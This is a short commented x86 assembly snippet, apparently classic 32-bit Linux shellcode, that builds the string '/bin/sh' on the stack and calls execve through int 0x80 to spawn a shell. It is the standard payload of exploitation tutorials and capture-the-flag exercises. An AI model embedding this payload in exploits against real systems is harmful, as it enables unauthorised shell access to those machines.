# eax = sys_execve
mov eax, 11
# write /bin/sh @esp
mov dword ptr [esp], 0x6e69622f
mov dword ptr [esp+4], 0x0068732f
# ebx = @/bin/sh
mov ebx, esp
# nullify the other args
xor ecx, ecx
xor edx, edx
# trigger interrupt
int 0x80